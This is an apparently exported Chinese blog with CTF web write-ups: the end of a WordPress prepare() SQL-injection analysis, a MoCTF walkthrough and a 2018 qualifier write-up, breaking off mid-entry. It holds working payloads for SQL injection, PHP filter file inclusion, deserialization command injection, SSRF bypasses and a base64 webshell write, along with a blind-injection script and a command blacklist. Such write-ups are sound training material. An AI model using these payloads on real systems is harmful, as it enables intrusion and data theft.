去掉第二个单引号就需要使该单引号成为%后的第一个字符，也就是%’，但是我们还需要一个占位符，%1$’ 这样就没有报错的去掉了该单引号 所以我们构造的payload为123456$meta_value = %1$%s AND SLEEP(5)#=&gt; AND meta_value = &apos;%1$%s AND SLEEP(5)&apos;=&gt; &quot;SELECT $type_column FROM $table WHERE meta_key = &apos;%s&apos; AND meta_value = AND meta_value = &apos;%1$&apos;%s&apos; AND SLEEP(5)#&apos;&quot;,&apos;admin&apos;其中 %1$&apos; =&gt; 空=&gt; SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = AND meta_value = &apos;admin&apos; AND SLEEP(5)#&apos;成功利用该漏洞形成时间注入 漏洞修补 现在我们说一下第四部分开头的补救方法后来官方在prepare函数加了这一代码1$query = preg_replace( &apos;/%(?:%|$|([^dsF]))/&apos;, &apos;%%\\1&apos;, $query ); // escape any unescaped percents 只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位]]></content>
      <categories>
        <category>格式化字符串漏洞</category>
        <category>Wordpress</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>格式化字符串漏洞</tag>
        <tag>Wordpress</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[moctf-web探索]]></title>
    <url>%2F2018%2F11%2F02%2F1%2F</url>
    <content type="text"><![CDATA[题记：前天晚上突然想刷CTF，就找了上个星期刚刚重新开放Moctf平台，作为一只半只脚还没踏进大门的webdog，记录一下自己的web历程。 0x01 一道水题 进入后，点击查看源码即可获得flagview-source:http://119.23.73.3:5001/web1/。 0x02 还是水题 一道考察html标签属性的题目，修改disabled与maxlength属性123&lt;input type=&quot;password&quot; value=&quot;&quot; disabled=&quot;disabled&quot; name=&quot;password&quot; maxlength=&quot;4&quot;&gt;=&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt; 0x03 访问限制 提示：只允许使用NAIVE浏览器访问！显然考察user-agent，于是修改user-agent发包，发现回显为：只有香港记者才能访问，于是又去修改Accept-Language，得到flag12User-Agent: NAIVEAccept-Language: zh-HK,zh;q=0.9 插一个题外话，NAIVE浏览器让我想到了黑曜石浏览器，做个题目时，我条件反射地先去go0gle了一下NAIVE浏览器，看看有木有这个浏览器-.-，想试一下的朋友们可以点击 0x04 机器蛇 第一眼看到后，想到应该是考察js，然后就想F12看一下js代码大体逻辑，emmmm，看完没发现什么，直到把翻到最下面，才意识到自己思路错了。提示&lt;!–robots.txt–&gt;，访问发现flagxxxx.php,再次访问，在注释中可以得到flag 0x05 PHP黑魔法 看到名字，应该就能菜刀是php弱类型。进入提示：似乎少点什么，查看源代码，抓包均无果，考虑源码泄漏，发现是index.php~源码泄漏。123456789101112131415161718view-source:http://119.23.73.3:5001/web5/index.php~=&gt;&lt;?php $flag=&quot;moctf&#123;**************&#125;&quot;; if (isset($_GET[&apos;a&apos;])&amp;&amp;isset($_GET[&apos;b&apos;])) &#123; $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; if($a==$b) &#123; echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;; &#125; else &#123; if(md5($a)==md5($b)) &#123; echo &quot;&lt;center&gt;&quot;.$flag.&quot;&lt;/center&gt;&quot;; echo &quot;By:daoyuan&quot;; &#125; else echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;; &#125; &#125; payload: ?a=QNKCDZO&amp;b=240610708 0x06 我想要钱 源码审计题目123456789101112&lt;?php include &quot;flag.php&quot;; highlight_file(__FILE__); if (isset($_GET[&apos;money&apos;])) &#123; $money=$_GET[&apos;money&apos;]; if(strlen($money)&lt;=4&amp;&amp;$money&gt;time()&amp;&amp;!is_array($money))&#123; echo $flag; &#125; else echo &quot;Wrong Answer!&quot;; &#125; else echo &quot;Wrong Answer!&quot;;?&gt; 限制为：money长度小于5，并且数值很大，不是数组。payload: ?money=4e10 0x07 登录就对了 根据题目，是想让我们登录进去，首先是试弱口令，无果；再试万能密码，成功登录，flag在源代码中1payload：name = admin&apos; or 1=1#&amp;pass=1 0x08 文件包含 发现flfile=welcome.txt，于是尝试LFIpayload：http://119.23.73.3:5001/web8/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php=&gt;base64解码得到flag 0x09 暴跳的老板 抓包发现reponse里面有提示123456789101112131415161718192021222324252627# reponseHTTP/1.1 200 OKDate: Fri, 02 Nov 2018 17:24:35 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.14Dear: MyBossVary: Accept-EncodingContent-Length: 137Content-Type: text/html于是携带参数请求POST /web1/do.php HTTP/1.1Host: 119.23.73.3:5006Proxy-Connection: keep-aliveContent-Length: 22Cache-Control: max-age=0Origin: http://119.23.73.3:5006Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://119.23.73.3:5006/web1/post.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=hgcbrc4a6o6p6v14dpd8prvdj2postText=1&amp;Dear=MyBoss 0x10 Flag在哪？ 进入点击get flag，回显是there is no flag! 果断抓包看一下，考察302重定向12345678910111213141516171819202122带有特征的过程：GET /web7/flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./where_is_flag.php=&gt;GET /web7/./where_is_flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./I_have_a_flag.php=&gt;GET /web7/././I_have_a_flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./I_have_a_frog.php=&gt;GET /web7/./././I_have_a_frog.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./no_flag.php=&gt;GET /web7/././././no_flag.php HTTP/1.1 emmm，follow rediretion没有发现任何异常唯一有价值的就是body中内容：12345where is flag!I have a flagI have a frog!ah~ guess where is flag!There is no flag! 得知hint才知道，，这是一首歌曲:ppap，访问flagfrog.php得到答案 0x11 美味的饼干 登录admin，发现可以登录，抓包发现12345Set-Cookie: login=ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%3D解码为 user于是再次编码adminMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D得到flag 0x12 没时间解释了 进入后，发现url为 http://119.23.73.3:5006/web2/index2.php 。于是抓包，发现302重定向，得到提示：May be u need uploadsomething.php。访问上传页面，随便上传一个，123filename: adminconcet: admin路径：http://119.23.73.3:5006/web2/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/admin 访问，显示too low，猜测应该是，上传文件会在一定的时间删除吗，并且路径不变。于是bp.intrude走一波。1234567891011GET /web2/uploadsomething.php?filename=admin&amp;content=admin HTTP/1.1Host: 119.23.73.3:5006Proxy-Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9a=§1§ attack后 ,浏览器访问http://119.23.73.3:5006/web2/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/admin 即可得到flag 0x13 死亡退出123456789101112&lt;?php show_source(__FILE__); $c=&quot;&lt;?php exit;?&gt;&quot;; @$c.=$_POST[&apos;c&apos;]; @$filename=$_POST[&apos;file&apos;]; if(!isset($filename)) &#123; file_put_contents(&apos;tmp.php&apos;, &apos;&apos;); &#125; @file_put_contents($filename, $c); include(&apos;tmp.php&apos;);?&gt; 有include函数，首先想到文件包含，但是tmp.php不可控，只能执行tmp.php，可控的是temp.php的内容，于是通过php危险函数file_put_contents()写命令，c=bPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php，即可拿到flag123456789101112131415涉及到的两个知识点：1、file_put_contents()：file_put_contents(file,data,mode,context)data要写入的数据。类型可以是 string，array 或者是 stream 资源（如上面所说的那样）。如果 data 指定为 stream 资源，这里 stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。就是将context内容写到data中。题目中：使用php://filter/write=convert.base64-decode/resource=tmp.php，tmp.php中写入内容，通过写入base64解码后的数据流实现，配合file_put_contents()使用进行写命令另外附上p牛对这个经典问题的分析https://www.leavesongs.com/PENETRATION/php-filter-magic.html2、base64 编码base64 解码表A-Z、a-z、0-9、+、/，其它的内容 base64 解码会将其过滤掉，比如&lt;?;&gt;与空格，就会自动过滤掉因为题目中的 &lt;?php exit;&gt; =&gt; phpexitbase64 算法解码时是4个byte一组，所以该题目如果phpexit正常解码，不影响后面的一句话，就必须构造8个字符。在 &lt;?php system(&apos;cat flag.php&apos;); ?&gt; base64编码的前面加一个字母即可 0x14 火眼金睛 这个题目意在靠脚本编写，做题时使用的非预期解，bp抓包后，在页面中，搜索moctf的个数，携带参数repeater，即可拿到flag附上预期解脚本：123456789101112131415import requestsimport retargeturl = &quot;http://119.23.73.3:5001/web10&quot;r = requests.get(url=targeturl)res_tr = r&quot;&apos;100&apos;&gt;(.*?)&lt;/textarea&gt;&quot;flagtxt = re.findall(res_tr,r.content)[0]re_moctf = r&quot;moctf&quot;moctf = re.findall(re_moctf,flagtxt)number = len(moctf)ans = &#123; &quot;answer&quot;:number&#125;url2 = &quot;http://119.23.73.3:5001/web10/work.php&quot;s = requests.post(url=url2,data=ans,cookies=r.cookies)print s.content 0x15 UNSET123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(&apos;index.php&apos;);function waf($a)&#123;foreach($a as $key =&gt; $value)&#123; if(preg_match(&apos;/flag/i&apos;,$key))&#123; exit(&apos;are you a hacker&apos;);&#125;&#125;&#125;foreach(array(&apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET[&apos;flag&apos;]))&#123;if($_GET[&apos;flag&apos;] === $_GET[&apos;daiker&apos;])&#123; exit(&apos;error&apos;);&#125;if(md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;daiker&apos;]))&#123; include($_GET[&apos;file&apos;]);&#125;&#125;?&gt; 分析逻辑：需要执行include($_GET[‘file’])=&gt;$_GET[‘file’]为flag.php，但是waf会过滤，那么为了完成这个目的，我们需要先绕过waf再读flag.php根据代码逻辑可以发现unset =&gt; waf检测 =&gt; 再次赋值那么关键性代码：12345foreach(array(&apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; 我们需要做的就是把$_GET的参数unset，过了waf再赋值，再利用文件包含读出flag.php的内容过程：1234567891011121、md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;daiker&apos;])=&gt;flag=QNKCDZO&amp;daiker=s878926199a2、过waf=&gt;以flag参数为例子GET: ?flag=QNKCDZO =&gt;array(&apos;flag&apos; =&gt; &apos;QNKCDZO&apos;)post: _GET[x]=QNKCDZO先进行处理post参数 $$__R 是 $POST[_GET[x]] =&gt; array(&apos;_GET[x]&apos; =&gt; &apos;QNKCDZO&apos;) =&gt; $__k 是 _GET[x] =&gt; $$__k 是 $_GET[x] 是 QNKCDZO，于是符合 $$__k == $__v，执行unset($_GET[x])，即$__GET[flag]被unset了。后来extract()再次赋值 payload:12345678910111213POST /index.php?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=php://filter/read=convert.base64-encode/resource=flag.php HTTP/1.1Host: 119.23.73.3:5101Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=om11lglr53tm1htliteav4uhk4Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 112_GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=php://filter/read=convert.base64-encode/resource=flag.php 0x16 PUBG http://120.78.57.208:6001/?LandIn=school 发现该处.bak源码泄漏，下载index.php与class.php1234567# index.phpelseif($pos===&quot;school&quot;) &#123; echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot; style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&apos;); $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); &#125; 可以发现是php反序列化漏洞12345678910111213141516171819202122232425262728# class.phppublic function __destruct()&#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;) &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125;&#125;public function Get_air_drops($b)&#123; $this-&gt;$b();&#125;public function __call($method,$parameters) &#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;)) &#123; system(&quot;php .//class//$method.php&quot;); &#125;else &#123; system(&quot;php .//class//win.php&quot;); &#125; die();&#125; 分析逻辑与过程12345678910111213141516171819202122232425262728293031323334 目的：__call()过程:唯一可控的为__destruct()=&gt; Get_air_drops($b)=&gt; $this-&gt;$b();刚好可以调用__call()注意：__wakeup()不能执行$b为命令 =&gt; $bag控制$bag即可$bag又经过waf处理做法：绕过__wakeup()，读waf绕过waf，rce原理：绕过__wakeup()CVE-2016-7124反序列化漏洞，通过传入错误的值绕过具体实现：从源码中在class/下发现flag.phpO:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:13:&quot;flag.|cat%20waf&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;$black = array(&apos;vi&apos;,&apos;awk&apos;,&apos;-&apos;,&apos;sed&apos;,&apos;comm&apos;,&apos;diff&apos;,&apos;grep&apos;,&apos;cp&apos;,&apos;mv&apos;,&apos;nl&apos;,&apos;less&apos;,&apos;od&apos;,&apos;head&apos;,&apos;tail&apos;,&apos;more&apos;,&apos;tac&apos;,&apos;rm&apos;,&apos;ls&apos;,&apos;tailf&apos;,&apos;%&apos;,&apos;%0a&apos;,&apos;%0d&apos;,&apos;%00&apos;,&apos;ls&apos;,&apos;echo&apos;,&apos;ps&apos;,&apos;&gt;&apos;,&apos;&lt;&apos;,&apos;$&#123;IFS&#125;&apos;,&apos;ifconfig&apos;,&apos;mkdir&apos;,&apos;cp&apos;,&apos;chmod&apos;,&apos;wget&apos;,&apos;curl&apos;,&apos;http&apos;,&apos;www&apos;,&apos;`&apos;,&apos;printf&apos;);=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:20:&quot;flag.|cat%20class/flag&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;个人提醒一下，/class/flag与class/flag不一样 这里做了一个反序列化的测试123456789101112131415161718192021222324252627282930313233&lt;?php class sheldon&#123; public function __construct() &#123; echo &quot;__construct()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __wakeup() &#123; echo &quot;__wakeup()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __call($method,$parameters) &#123; echo &quot;__call()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;__destruct()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; &#125; $a = new sheldon; $sa = serialize($a); echo $sa; echo &quot;&lt;br/&gt;&quot;; $ua = unserialize($sa); var_dump($ua); echo &quot;&lt;br/&gt;&quot;; var_dump(unserialize(&apos;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;&apos;)); echo &quot;&lt;br/&gt;&quot;; $a-&gt;b(); 输出结果：123456789101112__construct() //new 调用的O:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;__wakeup() //unserialize($a)调用的object(sheldon)#2 (2) &#123; [&quot;bag&quot;]=&gt; string(7) &quot;nothing&quot; [&quot;weapon&quot;]=&gt; string(3) &quot;M24&quot; &#125; Notice: unserialize(): Unexpected end of serialized data in A:\tools\phpStudy\WWW\study1\pre.php on line 33__destruct() //unserialize($a)调用的Notice: unserialize(): Error at offset 64 of 65 bytes in A:\tools\phpStudy\WWW\study1\pre.php on line 33bool(false) __call() //$a-&gt;b()调用的__destruct() //unserialize(&apos;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;&apos;)调用的__destruct() // 照应new 0x17 网站检测 hint: doker -p 10001 80说明80端口映射到10001，url参数可以进行ssrf测试发现，必须http://moctf.com，过滤&#39;127&#39;，与点，flag.php使用url双编码123456789也考察url结构：方法//身份凭证@真是ip/路径有几个payloadpayload:url = http://www.moctf.com/0.0.0.0/%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30另外几个可以把0.0.0.0 =&gt; 127.0.0.1127.0.0.1=&gt; 8进制017700000001=&gt; 16进制0x7f000001 / 0x7f.1 0x18 简单注入 查看源代码发现注入点为 ?id测试发现空格，/**/，and，or，–+等被禁用使用异或盲注脚本：1234567891011121314151617181920212223242526272829import stringimport requestschars = &apos;!@$%^&amp;*()_+=-|&#125;&#123; :?&gt;&lt;[];,./`~&apos;string = string.ascii_letters+string.digits+charsrs = requests.session()flag = &quot;&quot;# 错误的payload# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(database())),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema)=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# 正确payload# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;for i in range(0, 500): # for j in string: for j in range(33, 127): url = payload.format(str(i), str(j)) s = rs.get(url) # print url if &apos;Flag&apos; in s.text: flag = flag + chr(j) print flag 得到flag，题外话，因为注入姿势不对，这个题目交flag，交了一天，emmmmmm，大佬们有兴趣可以试试脚本上错误payload，能感受到当时的纠结的心情-.-(其实我在掩盖自己菜的事实)。记录一下错误原因：123456789101112131415mysql&gt; select (mid(&apos;Aa&apos;,1,1)=&apos;A&apos;);+---------------------+| (mid(&apos;Aa&apos;,1,1)=&apos;A&apos;) |+---------------------+| 1 |+---------------------+1 row in set (0.00 sec)mysql&gt; select (mid(&apos;Aa&apos;,1,1)=&apos;a&apos;);+---------------------+| (mid(&apos;Aa&apos;,1,1)=&apos;a&apos;) |+---------------------+| 1 |+---------------------+1 row in set (0.00 sec) 0x19 后记 依然能感觉到自己有很多不足，需要学习的太多了，多练习，多看大佬们的技术文章，紧随大佬的步伐。感谢星神等几位表哥的指点。]]></content>
      <categories>
        <category>CTF</category>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018WEB安全测试秋季预选赛WriteUp]]></title>
    <url>%2F2018%2F10%2F28%2F1%2F</url>
    <content type="text"><![CDATA[题记：学校组织参加这个比赛，对于没有信安专业的学院来说，参赛重点就是嵌入式与开发者，留下我们自生自灭，在此记录一下，刷下一存在感吧，虽然没拿到理想结果，毕竟来过233333。错误的地方，欢迎大佬们指正。 2018WEB安全测试秋季预选赛 0x01 input传送门：http://114.55.36.69:8003/题目上说前三道题目是容易的，于是就从容易的题目入手，为了拿到1血，手速飞快地点，emmm，一紧张忘了js输出语句怎么写了，百度后才发现，自己有多蠢alert啊！ 进入网址，发现一个输入框，查看源码，发现id=”flag”，后面有一段js代码 123456789101112&lt;script&gt; function check()&#123; var flag = document.getElementById(&quot;flag&quot;).value; var str = &quot;d84d9657e5e5e&quot; || 0; var str = str + (&quot;ad2ad3fe&quot; &amp;&amp; 2); var str = str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;; var str = str.split(&quot;&quot;).reverse().join(&quot;&quot;); if (str == flag)&#123; alert(&quot;恭喜你已经找到flag！&quot;); &#125; &#125;&lt;/script&gt; 二话不说，直接console下执行，emmmm，可惜一下。提交即可 0x02 MD5传送门：http://114.55.36.69:8004/ 打开后发现一段文字：easy MD5 cracking fail。应该与MD5有关，简单的就是弱类型，再不就是MD5碰撞，查看源码，发现是考察PHP弱类型 1easy MD5 cracking &lt;!--$_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;]--&gt;fail 脑补一下剩下的代码 123if(($_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;])&amp;&amp;(md5($_POST[&apos;data1&apos;])==md5($_POST[&apos;data2&apos;])) echo $flag; 于是post传参：data1=QNKCDZO&amp;data2=240610708，得到答案 0x03 参数提交传送门：http://114.55.36.69:8012/ flag作为参数，post方式提交，提示必须大于10位，提交flag=11111111111，即可得到flag。-.- 0x04 新闻查询传送门：http://114.55.36.69:8010/ 先上图有关键词，有条数，初步猜测是注入，关键词输入1’发现查看源码，发现前端过滤 1234567891011121314151617function myFunction() &#123; var x=document.getElementById(&quot;number&quot;).value; var a=document.getElementById(&quot;word&quot;).value; var b=a.replace(/[\ |\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\||\\|\[|\]|\&#123;|\&#125;|\;|\:|\&quot;|\&apos;|\,|\&lt;|\.|\&gt;|\/|\?|\·|\！|\（|\）|\￥|\——|\……|\【|\】|\、|\；|\：|\‘|\“|\”|\’|\，|\。|\、|\《|\》|\？|\ ]/g,&quot;&quot;); if(a.length!=b.length) &#123; alert(&quot;请输入正确字符。&quot;); document.getElementById(&quot;number&quot;).value = &apos;&apos;; document.getElementById(&quot;word&quot;).value = &apos;&apos;; &#125; else if(isNaN(x)) &#123; alert(&quot;请输入数字。&quot;); document.getElementById(&quot;number&quot;).value = &apos;&apos;; &#125; &#125; 于是手动禁掉js代码，并且猜测后端代码是关键词处查询处存在sql注入一直尝试，却没有任何回显，听说可以sqlmap直接跑，于是sqlmap启动！保存请求包，sqlmap -r payload.txt –dump当时时间也是关键，能出flag就可以，写这个时候，才手动注入，像这种的关键词查询，一般都是使用like%%的模糊查询,所以需要闭合%，构造payload：1%’ AND 1=1 AND ‘%’=’成功注入这里对like%%进行一些了解首先我们在本地数据库中输入12345678910111213141516mysql&gt; select * from tests where password like &apos;%a%&apos;;+---------+----------+| usename | password |+---------+----------+| admin | password || admin | admin |+---------+----------+2 rows in set (0.00 sec)mysql&gt; select * from tests where password like &apos;%as%&apos;;+---------+----------+| usename | password |+---------+----------+| admin | password |+---------+----------+1 row in set (0.00 sec) 可以发现like%$value%相当于/.*$value.*/，如果注入的话，我们需要闭合前面的%’,而且还有闭合后面的%’红框里面的内容为外部输入。了解完like%%的注入，接着看题目123456789# 得到列payload: 1%&apos; order by 3-- 返回正常payload: 1%&apos; order by 4--返回异常得知表有为3列# 找回显点payload: 1%&apos; union select 1,2,3-- 在页面下面出现1,2，3 12# 注入表，列，字段，此处省略过程payload: 1%&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()),flag from admin-- 成功拿到flag 0x05 MD5碰撞传送门：http://114.55.36.69:8006/ 又是一个关于MD5的题目，而且提示依然为：MD5 crackingfail。这样从分值与顺序看起来，不出意外就是MD5碰撞，查看源码发现1if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;])) 这里两边都是强判断===，并且强制转换为string类型进行比较，听表哥说，只能通过md5碰撞绕过去先了解一下什么是md5碰撞12## md5碰撞从根本上讲，MD5算法是一种摘要算法，它可以从多个字节组成的串中计算出由32个字节构成的“特征串”。对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在两个（或更多）不同的串能够得出相同MD5值的情况。这种情况就叫做MD5碰撞。 我们需要找到两个字符串不一样，但是MD5值一模一样的字符串，用MD5碰撞生成器生成 12345678910&gt; fastcoll_v1.0.0.5.exe -o data1.txt data2.txtMD5 collision generator v1.5by Marc Stevens (http://www.win.tue.nl/hashclash/)Using output filenames: &apos;data1.txt&apos; and &apos;data2.txt&apos;Using initial value: 0123456789abcdeffedcba9876543210Generating first block: .............Generating second block: S01.....Running time: 8.187 s 然后对data1.txt与data2.txt中的内容进行url编码后，curl发请求，或者在该网址中找，即可得到flag123456789101112131415161718192021222324root@Kali:~# curl -v http://114.55.36.69:8006/ -H &quot;Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&quot; --data &quot;data1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;data2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;* Hostname was NOT found in DNS cache* Trying 114.55.36.69...* Connected to 114.55.36.69 (114.55.36.69) port 8006 (#0)&gt; POST / HTTP/1.1&gt; User-Agent: curl/7.38.0&gt; Host: 114.55.36.69:8006&gt; Accept: */*&gt; Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&gt; Content-Length: 315&gt; Content-Type: application/x-www-form-urlencoded&gt; * upload completely sent off: 315 out of 315 bytes&lt; HTTP/1.1 200 OK&lt; Date: Sun, 28 Oct 2018 16:57:05 GMT* Server Apache/2.2.15 (CentOS) is not blacklisted&lt; Server: Apache/2.2.15 (CentOS)&lt; X-Powered-By: PHP/5.3.3&lt; Content-Length: 156&lt; Connection: close&lt; Content-Type: text/html; charset=UTF-8&lt; * Closing connection 0MD5 cracking&lt;!-- if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;]))--&gt;flag&#123;9bd1ee7355b58e53214adb9a37b4cb82&#125; 在这备份几条 12345678# 